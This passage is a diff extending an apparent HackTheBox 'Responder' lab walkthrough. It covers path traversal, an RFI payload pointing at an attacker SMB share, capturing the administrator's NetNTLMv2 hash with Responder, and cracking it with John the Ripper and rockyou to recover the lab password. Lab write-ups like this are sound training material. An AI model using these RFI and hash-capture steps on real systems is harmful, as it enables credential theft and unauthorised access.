@@ -169,3 +169,36 @@ The answer is ../../../../../../../../windows/system32/drivers/etc/hosts, becaus
 
 The answer is //10.10.14.6/somefile
 (RFI), an attacker can cause the web application to include a remote file
+
+6. What does NTLM stand for?
+I check this acronym and i found this:
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/e6695819-db34-4a47-bcc7-e1def245279d)
+
+7. Which flag do we use in the Responder utility to specify the network interface? 
+I wrote in terminal responder -h and there i found this what i needed
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/dee62ab8-f893-4677-9c78-8054a9571b91)
+
+8. There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?. 
+This tool is john the ripper. John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems
+
+9. What is the password for the administrator user? 
+First what we need to do is turn on the responder: responder -I tun0
+Then go to the website and do RFI, do http://unika.htb/index.php?page=//<IP>/nothing, after this you can see in ur responder username and hash of administrator password:
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/5c8a7f63-1ae4-43a7-9cc6-19791223127c)
+
+Now save this hash, and use john: john -w=/usr/share/wordlist/rockyou hash.txt
+The password is badminton
+
+10. We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? 
+We need to scan the machine and check what's running on the server
+
+i found something intresting check this out
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/5ae7ef52-785e-4118-96f0-c0fdb12fc0eb)
+
+11. Submit root flag 
+We need to search something about this port i always reccomend check on the hacktricks, on this website is everything
+I found how to login into this port.
